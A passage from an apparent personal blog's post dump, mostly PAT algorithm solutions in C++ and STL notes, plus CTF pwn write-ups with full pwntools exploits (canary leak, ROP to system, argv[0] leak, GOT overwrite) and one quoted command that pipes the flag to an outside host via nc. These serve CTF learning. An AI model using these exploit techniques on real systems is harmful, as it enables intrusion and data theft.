adjacent numbers, and no extra space at the end of each line. Sample Input:51 3 2 4 5 Sample Output:31 4 5 用两个数组维护最大最小值 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;cstdio&gt;#include&lt;cmath&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;limits&gt;using namespace std;typedef long long LL;const int maxN = 1e5 + 10;int n;int num[maxN];int flag;int minn[maxN];int maxn[maxN];int ans[maxN];int tmp;int main()&#123; scanf(\"%d\", &amp;n); num[0] = numeric_limits&lt;int&gt;::min(); num[n + 1] = numeric_limits&lt;int&gt;::max(); for (int i = 1; i &lt;= n; i++) scanf(\"%d\", &amp;num[i]); for (int i = 1; i &lt;= n; i++) maxn[i] = max(maxn[i - 1], num[i]); minn[n + 1] = num[n + 1]; for (int i = n; i &gt;= 1; i--) minn[i] = min(minn[i + 1], num[i]); for (int i = 1; i &lt;= n; i++) &#123; if (num[i] &gt; maxn[i - 1] &amp;&amp; num[i] &lt; minn[i + 1]) &#123; ans[flag] = num[i]; flag++; &#125; &#125; printf(\"%d\\n\", flag); for (int i = 0; i &lt; flag; i++) (!i) ? printf(\"%d\", ans[i]) : printf(\" %d\", ans[i]); printf(\"\\n\"); return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1078","date":"2017-02-20T04:30:58.000Z","path":"2017/02/20/PAT-advanced-1078/","text":"Description 1078.Hashing The task of this problem is simple: insert a sequence of distinct positive integers into a hash table, and output the positions of the input numbers. The hash function is defined to be “H(key) = key % TSize” where TSize is the maximum size of the hash table. Quadratic probing (with positive increments only) is used to solve the collisions. Note that the table size is better to be prime. If the maximum size given by the user is not prime, you must re-define the table size to be the smallest prime number which is larger than the size given by the user. Input Specification: Each input file contains one test case. For each case, the first line contains two positive numbers: MSize (&lt;=104) and N (&lt;=MSize) which are the user-defined table size and the number of input numbers, respectively. Then N distinct positive integers are given in the next line. All the numbers in a line are separated by a space. Output Specification: For each test case, print the corresponding positions (index starts from 0) of the input numbers in one line. All the numbers in a line are separated by a space, and there must be no extra space at the end of the line. In case it is impossible to insert the number, print “-“ instead. Sample Input:4 410 6 4 15 Sample Output:0 1 4 - 看书好长一段，看看被人的代码一下就懂了，QAQ二次方探查就是用(x + i * i) % Tsize这么个东西吧。。哦，想起来个注释小技巧，这样写/*···············//*/，去掉注释删除前一个/*即可 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include&lt;cstdio&gt;#include&lt;cmath&gt;#include&lt;iostream&gt;#include&lt;map&gt;#include&lt;string&gt;using namespace std;typedef long long LL;const int maxS = 1e4 + 10;int m, n;int t[maxS] = &#123;0&#125;;int x;bool prime(int x)&#123; if (x == 1) return false; if (x == 2) return true; if (x == 3) return true; for (int i = 2; i &lt; sqrt(x) + 1; i++) if (x % i == 0) return false; return true;&#125;int findp(int x)&#123; for (int i = x + 1;; i++) if (prime(i)) return i;&#125;//*/int main()&#123; scanf(\"%d%d\", &amp;m, &amp;n); if (!prime(m)) m = findp(m); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;x); int flag = 0; if (i) printf(\" \"); for (int i = 0; i &lt; m; i++) &#123; int y = (x + i * i) % m; if (!t[y]) &#123; printf(\"%d\", y); t[y] = 1; flag = 1; break; &#125; &#125; if (!flag) printf(\"-\"); &#125; //*/ return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1112","date":"2017-02-19T07:49:26.000Z","path":"2017/02/19/PAT-advanced-1112/","text":"Descritpion 1112.Stucked Keyboard On a broken keyboard, some of the keys are always stucked. So when you type some sentences, the characters corresponding to those keys will appear repeatedly on screen for k times. Now given a resulting string on screen, you are supposed to list all the possible stucked keys, and the original string. Notice that there might be some characters that are typed repeatedly. The stucked key will always repeat output for a fixed k times whenever it is pressed. For example, when k=3, from the string “thiiis iiisss a teeeeeest” we know that the keys “i” and “e” might be stucked, but “s” is not even though it appears repeatedly sometimes. The original string could be “this isss a teest”. Input Specification: Each input file contains one test case. For each case, the 1st line gives a positive integer k ( 1&lt;k&lt;=100 ) which is the output repeating times of a stucked key. The 2nd line contains the resulting string on screen, which consists of no more than 1000 characters from {a-z}, {0-9} and “_“. It is guaranteed that the string is non-empty. Output Specification: For each test case, print in one line the possible stucked keys, in the order of being detected. Make sure that each key is printed once only. Then in the next line print the original string. It is guaranteed that there is at least one stucked key. Sample Input:3caseee1__thiiis_iiisss_a_teeeeeest Sample Output:eicase1__this_isss_a_teest 注意：必须全部输入才能判断坏键，如sss_s已判断为坏键为错误。一旦确定为好键则不会修改为坏键。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;map&gt;#include&lt;string&gt;using namespace std;typedef long long LL;int k;int cou = 0;int sta = 0;char pre;string mes;string ans = \"\";string wrong = \"\";map&lt;char, int&gt; m;int main()&#123; scanf(\"%d\", &amp;k); cin &gt;&gt; mes; mes += '#'; m.insert(pair&lt;char, int&gt;('_', -1)); for (char i = 'a'; i &lt;= 'z'; i++) m.insert(pair&lt;char, int&gt;(i, -1)); for (char i = '0'; i &lt;= '9'; i++) m.insert(pair&lt;char, int&gt;(i, -1)); pre = mes[0]; for (int i = 0; i &lt; mes.length(); i++) &#123; if (pre == mes[i]) &#123; sta = 0; cou++; &#125; else &#123; sta = 1; if (cou % k == 0 &amp;&amp; m[pre] == -1) &#123; m[pre] = 0; wrong += pre; &#125; if (cou % k != 0) &#123; m[pre] = 1; &#125; pre = mes[i]; cou = 1; continue; &#125; &#125; for (int i = 0; i &lt; wrong.size(); i++) if (m[wrong[i]] == 0) cout &lt;&lt; wrong[i]; cout &lt;&lt; endl; for (int i = 0; i &lt; mes.size() - 1;) if (m[mes[i]]) &#123; cout &lt;&lt; mes[i]; i++; &#125; else &#123; cout &lt;&lt; mes[i]; i += k; &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"C++ STL Map","date":"2017-02-19T03:36:24.000Z","path":"2017/02/19/C-STL-Map/","text":"mapmap是STL的一个关联容器，提供key到value映射，类似python里的字典的功能。map内自建一棵红黑树，具有对数据自动排序的功能，所以map内部的所有数据都是有序的。 #include&lt;map&gt;map&lt;key, value&gt; key_to_value 成员函数 函数 用法 begin() 返回指向map头部的迭代器 clear() 删除所有元素 count(elem) 返回指定出现的次数 empty() 判断是否空 end() 指向map末尾的迭代器 equal_range() 返回特殊条目的迭代器对 erase() 删除一个元素 find() 查找一个元素 get_allocator() 返回map的配置器 insert() 插入元素 key_comp() 返回比较元素key的函数 lower_bound() 返回键值&gt;=给定元素的第一个位置 max_size() 返回可以容纳的最大元素数 rebign() 返回一个可以指向map尾部的逆向迭代器 rend() 返回一个指向map头部的逆向迭代器 size() 返回map中元素的数目 swap() 交换两个map upper_bound() 返回键值&gt;给定元素的第一个位置 value_comp() 返回比较value的函数","tags":[{"name":"STL","slug":"STL","permalink":"http://reehy.top/tags/STL/"}]},{"title":"PAT advanced 1118","date":"2017-02-19T02:37:08.000Z","path":"2017/02/19/PAT-advanced-1118/","text":"Description 1118.Birds in Forest Some scientists took pictures of thousands of birds in a forest. Assume that all the birds appear in the same picture belong to the same tree. You are supposed to help the scientists to count the maximum number of trees in the forest, and for any pair of birds, tell if they are on the same tree. Input Specification: Each input file contains one test case. For each case, the first line contains a positive number N (&lt;= 104) which is the number of pictures. Then N lines follow, each describes a picture in the format:K B1 B2 … BKwhere K is the number of birds in this picture, and Bi’s are the indices of birds. It is guaranteed that the birds in all the pictures are numbered continuously from 1 to some number that is no more than 104. After the pictures there is a positive number Q (&lt;= 104) which is the number of queries. Then Q lines follow, each contains the indices of two birds. Output Specification: For each test case, first output in a line the maximum possible number of trees and the number of birds. Then for each query, print in a line “Yes” if the two birds belong to the same tree, or “No” if not. Sample Input:43 10 1 22 3 44 1 5 7 83 9 6 4210 53 7 Sample Output:2 10YesNo 查并集问题，知道了就好做了。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;set&gt;using namespace std;typedef long long LL;const int maxN = 1e4 + 10;const int maxQ = 1e4 + 10;int n, q;int x, y, z;int a, b;int pre[maxN + 1];int fa[maxN + 1];bool e[maxN + 1];int bn, tn;int find(int x)&#123; int r = x; while (pre[r] != r) r = pre[r]; int i = x, j; while (i != r) &#123; j = pre[i]; pre[i] = r; i = j; &#125; return r;&#125;void join(int x, int y)&#123; int fx = find(x), fy = find(y); if (fx != fy) pre[fy] = fx;&#125;int main()&#123; scanf(\"%d\", &amp;n); for (int i = 1; i &lt;= maxN; i++) pre[i] = i; while (n--) &#123; scanf(\"%d\", &amp;x); scanf(\"%d\", &amp;y); e[y] = true; for (int i = 0; i &lt; x - 1; i++) &#123; scanf(\"%d\", &amp;z); e[z] = true; if (z != find(z)) &#123; join(y, z); fa[z] = find(y); &#125; else &#123; join(z, y); fa[y] = find(z); &#125; &#125; &#125; for (int i = 1; i &lt;= maxN + 1; i++) if (e[i]) &#123; bn++; if (pre[i] == i)tn++; &#125; printf(\"%d %d\\n\", tn, bn); scanf(\"%d\", &amp;q); while (q--) &#123; scanf(\"%d%d\", &amp;a, &amp;b); (find(a) == find(b)) ? printf(\"Yes\\n\") : printf(\"No\\n\"); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1063","date":"2017-02-18T10:32:49.000Z","path":"2017/02/18/PAT-advanced-1063/","text":"Description 1063.Set Similarity Given two sets of integers, the similarity of the sets is defined to be Nc/Nt*100%, where Nc is the number of distinct common numbers shared by the two sets, and Nt is the total number of distinct numbers in the two sets. Your job is to calculate the similarity of any given pair of sets. Input Specification: Each input file contains one test case. Each case first gives a positive integer N (&lt;=50) which is the total number of sets. Then N lines follow, each gives a set with a positive M (&lt;=104) and followed by M integers in the range [0, 109]. After the input of sets, a positive integer K (&lt;=2000) is given, followed by K lines of queries. Each query gives a pair of set numbers (the sets are numbered from 1 to N). All the numbers in a line are separated by a space. Output Specification: For each query, print in one line the similarity of the sets, in the percentage form accurate up to 1 decimal place. Sample Input:33 99 87 1014 87 101 5 877 99 101 18 5 135 18 9921 21 3 Sample Output:50.0%33.3% 学习了几点简单的优化吧： int比float运算快 scnaf和printf比cin和cout运算快 一段程序比多段程序运算快（是不是把编译时间算上去了？还是call是一个耗时的指令？） Code12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;set&gt;using namespace std;typedef long long LL;const int maxN = 5e1 + 10;set&lt;int&gt; s[maxN];int n, ni;int a, b;int x, o;int inN = 0;int allN = 0;float ans = 0;set&lt;int&gt; ::iterator it;int main()&#123; scanf(\"%d\", &amp;n); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;ni); while (ni--) &#123; scanf(\"%d\", &amp;x); s[i].insert(x); &#125; &#125; scanf(\"%d\", &amp;o); while (o--) &#123; scanf(\"%d%d\", &amp;a, &amp;b); inN = 0; allN = 0; ans = 0; for (it = s[a].begin(); it != s[a].end(); it++) if (s[b].find(*it) != s[b].end())inN++; allN = s[a].size() + s[b].size() - inN; ans = (float)inN / allN; printf(\"%.1f%%\\n\", ans * 100); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"C++ STL Set","date":"2017-02-18T02:26:39.000Z","path":"2017/02/18/C-STL-Set/","text":"setset集合容器：实现了红黑树的平衡二叉检索树的数据结构，插入元素时，它会自动调整二叉树的排列，把元素放到适当的位置，以保证每个子树根节点键值大于左子树所有节点的键值，小于右子树所有节点的键值；另外，还得保证根节点左子树的高度与右子树高度相等。构造set集合主要目的是为了快速检索，不可直接去修改键值。 #include&lt;set&gt; 成员函数 函数 用法 begin() 返回指向第一个元素的迭代器 clear() 清除所有元素 count() 返回某个值元素的个数，实事上只返回0或1，不会重复插入 empty() 返回是否空 end() 指向最后一个元素后的一个迭代器，不是最后一个元素 equal_range() 返回集合中与给定值相等的上下限的两个迭代器 erase() 删除集合中的元素 find() 返回被查找元素的迭代器 get_allocator() 返回集合的分配器 insert() 在集合中插入元素 lower_bound() 指向&gt;=某值的第一个元素的迭代器 key_comp() 返回一个用于元素间值比较的函数 max_size() 返回集合能容纳的元素的最大限值 rbegin() 返回集合中指向最后一个元素的反向迭代器 rend() 返回集合中指向第一个元素的反向迭代器 size() 集合中元素额数目 swap() 交换两个集合的变量 upper_bound() 返回大于某个值元素的迭代器 value_comp() 返回一个用于比较元素间值的函数","tags":[{"name":"STL","slug":"STL","permalink":"http://reehy.top/tags/STL/"}]},{"title":"PAT advanced 1041","date":"2017-02-18T01:57:21.000Z","path":"2017/02/18/PAT-advanced-1041/","text":"Description 1041.Be Unique Being unique is so important to people on Mars that even their lottery is designed in a unique way. The rule of winning is simple: one bets on a number chosen from [1, 104]. The first one who bets on a unique number wins. For example, if there are 7 people betting on 5 31 5 88 67 88 17, then the second one who bets on 31 wins. Input Specification: Each input file contains one test case. Each case contains a line which begins with a positive integer N (&lt;=105) and then followed by N bets. The numbers are separated by a space. Output Specification: For each test case, print the winning number in a line. If there is no winner, print “None” instead. Sample Input 1:7 5 31 5 88 67 88 17Sample Output 1:31 Sample Input 2:5 888 666 666 888 888Sample Output 2:None 不会啥好算法，空间换时间。。用一个数组记录每个数字出现的次数。 Code1234567891011121314151617181920212223242526272829303132333435#include &lt;stack&gt;#include&lt;cstdio&gt; #include&lt;string&gt; #include&lt;cstring&gt; #include&lt;vector&gt; #include&lt;iostream&gt; #include&lt;queue&gt; #include&lt;algorithm&gt; using namespace std;typedef long long LL;const int maxN = 1e5 + 10;const int maxM = 1e4 + 10;int n, flag, k, ans = 0;int m[maxN];int c[maxM];int main()&#123; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; m[i]; c[m[i]]++; &#125; for (int i = 0; i &lt; n; i++) if (c[m[i]] == 1) &#123; cout &lt;&lt; m[i]; return 0; &#125; cout &lt;&lt; \"None\"; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"2017codgate pwn","date":"2017-02-17T10:55:14.000Z","path":"2017/02/17/2017codgate-pwn/","text":"话说一个笔误400分就没了= =，当时怎么就没发现呢，还是编程能力太差Orz babypwn简单题，和2017Ins的babypwn题目一样，除了32位变64位，后来才知道原来32位也可以构成ropchain，和64位一样的传参顺序，难道是如果栈上没有参数就到regs里去找？还是特殊函数传参方法不一样？总之知道dup2可以就好了，其他的接着在研究。。 程序没有在字符串后补\\00,先覆盖canary的\\00位泄露canary，然后泄露libcbase，然后dup2+system构成ropchain。 看了别人的wp，发现还有别的方法，由于程序里调用了system，可以先将用recv命令cat flag | nc reehy.top 6666写到内存中比如.data，然后用system(.data)即可。 exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *DEBUG = 1elf = ELF('./babypwn')system = 0x8048620system = elf.symbols['system']send = elf.symbols['send']system_got = elf.got['system']send_got = elf.got['send']start_main_got = elf.got['__libc_start_main']exit_got = elf.got['exit']recv_got = elf.got['recv']main = 0x08048A71ret = 0x08048572choose = 0x080488B1ppr = 0x08048b84if DEBUG: context.log_level = 'debug' libc = ELF('libc.so.6') p = remote('127.0.0.1', 8181)else: libc = ELF('libc-2.19_16.so') p = remote('110.10.212.130', 8889)def canary(): p.recvuntil('menu &gt;') p.sendline('1') p.recvuntil('Message :') payload = 'a' * 40 p.sendline(payload) p.recvline() a = p.recvline() canary = u32('\\x00' + a[0:3]) return canarydef leak40(addr): p.recvuntil('menu &gt;') p.sendline('1') p.recvuntil('Message :') offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0) payload = offset + p32(send) + p32(main) payload += p32(4) + p32(addr) + p32(4) + p32(0) p.sendline(payload) p.recvuntil('menu &gt;') p.sendline('3') p.recv(1) leak = u32(p.recv(4)) return leakdef dofomat(): p.recvuntil('menu &gt;') p.sendline('1') p.recvuntil('Message :') offset = 'a' * 40 + p32(canary) + 'a' * 8 + p32(0) payload = offset payload += p32(dup2) + p32(ppr) + p32(4) + p32(0) # failed! payload += p32(dup2) + p32(ppr) + p32(4) + p32(1) payload += p32(system) + p32(0) +p32(binsh) p.sendline(payload) p.recvuntil('menu &gt;') p.sendline('3')if __name__ == '__main__': canary = canary() leak = leak40(send_got) dup2 = libc.symbols['dup2'] - libc.symbols['send'] + leak binsh = libc.search('/bin/sh').next() - libc.symbols['send'] + leak dofomat() p.interactive() p.close()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"writeup","slug":"writeup","permalink":"http://reehy.top/tags/writeup/"}]},{"title":"ZCTF2015 pwn","date":"2017-02-17T09:59:16.000Z","path":"2017/02/17/ZCTF2015-pwn/","text":"整理了一下ZCTF2015的pwn，看看出题思路。。 guess 100这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目 1234567pwndbg&gt; checksec [*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 有canary，但是有栈溢出，栈溢出后__stack_check_fail会打印程序的名字，也就是argv[0]的值，我们溢出修改argv[0]的值为之前加载到内存的flag的地址即可。相关的ppt 断点在fgets(&amp;::s, v8 + 1, stream);，也就是.text:0000000000400A61 call _fgets前 123fseek(stream, 0LL, 0);fgets(&amp;::s, v8 + 1, stream);fclose(stream); gdb查看得到加载的地址 123456789pwndbg&gt; pd ► 0x400a61 call fgets@plt &lt;0x400800&gt; s: 0x6010c0 ◂— 0x0 n: 0x24 stream: 0x602010 ◂— 0xfbad2488 0x400a66 mov rax, qword ptr [rbp - 0x48] 0x400a6a mov rdi, rax 0x400a6d call fclose@plt &lt;0x4007a0&gt; exp如下，第一个用于获取flag长度，第二个用于攻击： 1234567891011121314from pwn import * if __name__ == '__main__': for i in range(40): payload = i *'a' p = process('./guess') print p.recvuntil('\\n') p.sendline(payload) result = p.recvuntil('\\n') if 'ZCTF' in result: print 'len=', i p.close() break p.close() 1234567891011121314from pwn import * context.log_level = 'debug' s = process('./guess') s.recvuntil('please guess the flag:') payload='ZCTF&#123;'+'A'*(32-5) + '\\x00' + 'a'*263 + p64(0x6010C5) s.sendline(payload) s.recvuntil('***: ') flagt = s.recvuntil('\\n')[:27] flag = 'ZCTF&#123;' for i in flagt: flag += chr(ord(i)^ord('A')) print flag s.close() note1 200checksec 1234567pwndbg&gt; checksec [*] '/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE 看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh 但是有一个地方不明白，got表的高8byte是什么？ 1234560x602018 &lt;puts@got.plt&gt;: 0x00007ffff7a7d690 0x00000000004007060x602028 &lt;printf@got.plt&gt;: 0x00007ffff7a63800 0x00007ffff7ad96500x602038 &lt;read@got.plt&gt;: 0x00007ffff7b04670 0x00007ffff7a2e7400x602048 &lt;strcmp@got.plt&gt;: 0x00007ffff7aac9c0 0x00000000004007660x602058 &lt;malloc@got.plt&gt;: 0x00007ffff7a91580 0x00007ffff7a7de700x602068 &lt;atoi@got.plt&gt;: 0x00007ffff7a44e80 0x00000000004007a6 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *DEBUG = 0if DEBUG: context.log_level = 'debug'elf = ELF('./note1')libc = ELF('libc.so.6')atoi_got = elf.got['atoi']puts_got = elf.got['puts']puts_off = libc.symbols['puts']read_off = libc.symbols['read']system_off = libc.symbols['system']p = process('./note1')def new(title, types, content): p.recvuntil('option---&gt;&gt;') p.sendline('1') p.recvuntil(':') p.sendline(title) p.recvuntil(':') p.sendline(types) p.recvuntil(':') p.sendline(content) returndef editnote(title,content): p.recvuntil('option---&gt;&gt;') p.sendline('3') p.recvuntil(':') p.sendline(title) p.recvuntil(':') p.sendline(content) returndef shownote(): p.recvuntil('option---&gt;&gt;\\n') p.sendline('2') returndef main(): payload = (0x100 + 0x10)*'a'+p64(0)+p64(puts_got - 0x70)+'b' new('a', 'aa', 'aaa') new('b', 'bb', 'bbb') editnote('a', payload) shownote() p.recvuntil('\\n') p.recvuntil('content=') buf = p.recvuntil('\\n')[:-1] + '\\x00\\x00' puts = u64(buf) print puts libc_base = puts - puts_off log.success('Libc base = ' + hex(libc_base)) read = libc_base + read_off system = libc_base + system_off new_got = p64(puts) + 'a'*24+p64(read)+'a'*40+p64(system) editnote('',new_got) p.sendline('/bin/sh') p.interactive() return 0if __name__ == '__main__': main()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"writeup","slug":"writeup","permalink":"http://reehy.top/tags/writeup/"}]},{"title":"C++ STL Stack","date":"2017-02-17T06:53:19.000Z","path":"2017/02/17/C-STL-Stack/","text":"Stack实现了栈的全部功能，(FIFO)数据结构。 #include&lt;stack&gt; 成员函数 函数 用法 empty() 是否为空，空返回true pop() 弹栈 push() 压栈 size() 返回栈元素数目 top() 返回栈顶元素","tags":[{"name":"STL","slug":"STL","permalink":"http://reehy.top/tags/STL/"}]},{"title":"C++ STL使用目录","date":"2017-02-17T06:33:22.000Z","path":"2017/02/17/C-STL使用目录/","text":"刷PAT甲级时顺便学习了下STL的用法。 STL头文件和容器类 #include Container Class 用法 deque deque 双端队列 list list 列表 map map 映射 queue queue, poriority_queue 队列 set set, multiset 集合 stack stack 栈 vector vector 变长数组","tags":[{"name":"STL","slug":"STL","permalink":"http://reehy.top/tags/STL/"}]},{"title":"PAT advanced 1066","date":"2017-02-17T06:09:58.000Z","path":"2017/02/17/PAT-advanced-1066/","text":"Description An AVL tree is a self-balancing binary search tree. In an AVL tree, the heights of the two child subtrees of any node differ by at most one; if at any time they differ by more than one, rebalancing is done to restore this property. Figures 1-4 illustrate the rotation rules. Now given a sequence of insertions, you are supposed to tell the root of the resulting AVL tree. Input Specification: Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=20) which is the total number of keys to be inserted. Then N distinct integer keys are given in the next line. All the numbers in a line are separated by a space. Output Specification: For each test case, print ythe root of the resulting AVL tree in one line. Sample Input 1:588 70 61 96 120Sample Output 1:70 Sample Input 2:788 70 61 96 120 90 65Sample Output 2:88 照着数据结构的书打的，等会再做1123复习下。。照着书还打错一遍Orz Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include&lt;stack&gt;#include&lt;cstdio&gt; #include&lt;string&gt; #include&lt;cstring&gt; #include&lt;vector&gt; #include&lt;iostream&gt; #include&lt;queue&gt; #include&lt;algorithm&gt; using namespace std;typedef long long LL;struct avlndoe&#123; int bf; int data; avlndoe *left; avlndoe *right; avlndoe(int d, avlndoe *l = NULL, avlndoe *r = NULL) : left(l), right(r), data(d), bf(0)&#123;&#125;&#125;* root;int n, data;void rotateL(avlndoe * &amp; ptr)&#123; avlndoe * subL = ptr; ptr = subL-&gt;right; subL-&gt;right = ptr-&gt;left; ptr-&gt;left = subL; ptr-&gt;bf = subL-&gt;bf = 0;&#125;void rotateR(avlndoe * &amp; ptr)&#123; avlndoe * subR = ptr; ptr = subR-&gt;left; subR-&gt;left = ptr-&gt;left; ptr-&gt;right = subR; ptr-&gt;bf = subR-&gt;bf = 0;&#125;void rotateLR(avlndoe * &amp; ptr)&#123; avlndoe * subR = ptr, *subL = subR-&gt;left; ptr = subL-&gt;right; subL-&gt;right = ptr-&gt;left; ptr-&gt;left = subL; ptr-&gt;bf &lt;= 0 ? subL-&gt;bf = 0 : subL-&gt;bf = -1; subR-&gt;left = ptr-&gt;right; ptr-&gt;right = subR; ptr-&gt;bf == -1 ? subR-&gt;bf = 1 : subR-&gt;bf = 0; ptr-&gt;bf = 0;&#125;void rotateRL(avlndoe * &amp; ptr)&#123; avlndoe * subL = ptr, *subR = subL-&gt;right; ptr = subR-&gt;left; subR-&gt;left = ptr-&gt;right; ptr-&gt;right = subR; ptr-&gt;bf &gt;= 0 ? subR-&gt;bf = 0 : subL-&gt;bf = 1; subL-&gt;right = ptr-&gt;left; ptr-&gt;left = subL; ptr-&gt;bf == 1 ? subL-&gt;bf = -1 : subL-&gt;bf = 0; ptr-&gt;bf = 0;&#125;bool Insert(avlndoe * &amp; ptr , int &amp;el)&#123; avlndoe * pr = NULL, *p = ptr, *q; int d; stack&lt;avlndoe *&gt; st; while (p != NULL) &#123; if (el == p-&gt;data) return false; pr = p; st.push(pr); (el &lt; p-&gt;data) ? p = p-&gt;left : p = p-&gt;right; &#125; p = new avlndoe(el); if (pr == NULL) &#123; ptr = p; return true; &#125; (el &lt; pr-&gt;data) ? pr-&gt;left = p : pr-&gt;right = p; while (!st.empty()) &#123; pr = st.top();st.pop(); (p == pr-&gt;left) ? pr-&gt;bf-- : pr-&gt;bf++; if (pr-&gt;bf == 0) break; if (pr-&gt;bf == 1 || pr-&gt;bf == -1) p = pr; else &#123; d = (pr-&gt;bf &lt; 0) ? -1 : 1; if (p-&gt;bf == d) (d == -1) ? rotateR(pr) : rotateL(pr); else (d == -1) ? rotateLR(pr) : rotateRL(pr); break; &#125; &#125; if (st.empty())ptr = pr; else &#123; q = st.top(); (q-&gt;data &gt; pr-&gt;data) ? q-&gt;left = pr : q-&gt;right = pr; &#125; return true;&#125;int main()&#123; cin &gt;&gt; n; while (n--) &#123; cin &gt;&gt; data; Insert(root, data); &#125; cout &lt;&lt; root-&gt;data &lt;&lt; endl; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1033","date":"2017-02-16T10:27:31.000Z","path":"2017/02/16/PAT-advanced-1033/","text":"Description 1033.To Fill or Not to Fill (25) With highways available, driving a car from Hangzhou to any other city is easy. But since the tank capacity of a car is limited, we have to find gas stations on the way from time to time. Different gas station may give different price. You are asked to carefully design the cheapest route to go. Input Specification: Each input file contains one test case. For each case, the first line contains 4 positive numbers: Cmax (&lt;= 100), the maximum capacity of the tank; D (&lt;=30000), the distance between Hangzhou and the destination city; Davg (&lt;=20), the average distance per unit gas that the car can run; and N (&lt;= 500), the total number of gas stations. Then N lines follow, each contains a pair of non-negative numbers: Pi, the unit gas price, and Di (&lt;=D), the distance between this station and Hangzhou, for i=1,…N. All the numbers in a line are separated by a space. Output Specification: For each test case, print the cheapest price in a line, accurate up to 2 decimal places. It is assumed that the tank is empty at the beginning. If it is impossible to reach the destination, print “The maximum travel distance = X” where X is the maximum possible distance the car can run, accurate up to 2 decimal places. Sample Input 1:50 1300 12 86.00 12507.00 6007.00 1507.10 07.20 2007.50 4007.30 10006.85 300Sample Output 1:749.17 Sample Input 2:50 1300 12 27.10 07.00 600Sample Output 2:The maximum travel distance = 1200.00 贪心算法： 遇到的最近的比当前加油站便宜的加油站，则加上足够到此车站的油；没有比当前车站便宜的，在当前车站加满油，到次便宜的车站；否则加满油，输出最远距离。 注意可能始发点没有加油站QAQ Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include&lt;cstdio&gt; #include&lt;string&gt; #include&lt;cstring&gt; #include&lt;vector&gt; #include&lt;iostream&gt; #include&lt;queue&gt; #include&lt;algorithm&gt; using namespace std;typedef long long LL;const int maxN = 5e2 + 10;int m, d, p, s;// the maximum capacity of the tank// the distance between Hangzhou and the destination city// the average distance per unit gas that the car can run 21// the total number of gas stationsstruct sta&#123; float x; float y; sta(float x = 0, float y = 0) :x(x), y(y)&#123;&#125;&#125;stat[maxN];float price;float dis = 0;float x;float y;bool gre()&#123; int z = 0; float h = 0; while (dis != d) &#123; int flag = -1; int maxs = m * p + dis; if (stat[0].y != 0) return 0; for (int i = z + 1; i &lt;= s; i++) &#123; if (stat[i].x &lt; stat[z].x &amp;&amp; stat[i].y &lt;= maxs) &#123; flag = i; price += (stat[flag].y - dis - h * p) / p * stat[z].x; h += (stat[flag].y - dis - h * p) / p; dis = stat[flag].y; h -= (stat[flag].y - stat[z].y) / p; z = flag; break; &#125; &#125; if (flag == -1) &#123; if (stat[z + 1].y &gt; maxs) &#123; dis = maxs; return 0; &#125; else &#123; float tmp = stat[z + 1].x; flag = z + 1; for (int i = z + 1; i &lt;= s; i++) if (stat[i].y &lt;= maxs &amp;&amp; stat[i].x &lt; tmp) &#123; flag = i; tmp = stat[i].x; &#125; price += (m - h) * stat[z].x; h += m - h; dis = stat[flag].y; h -= (stat[flag].y - stat[z].y) / p; z = flag; &#125; &#125; &#125; return 1;&#125;int main()&#123; scanf(\"%d%d%d%d\", &amp;m, &amp;d, &amp;p, &amp;s); for (int i = 0; i &lt; s; i++) &#123; scanf(\"%f\", &amp;x); scanf(\"%f\", &amp;y); stat[i] = sta(x, y); &#125; stat[s] = sta(0, d); for (int i = 0; i &lt; s - 1; i++) for (int j = i + 1; j &lt; s; j++) if (stat[i].y &gt; stat[j].y) swap(stat[i], stat[j]); gre() ? printf(\"%.2f\\n\", price) : printf(\"The maximum travel distance = %.2f\\n\", dis); return 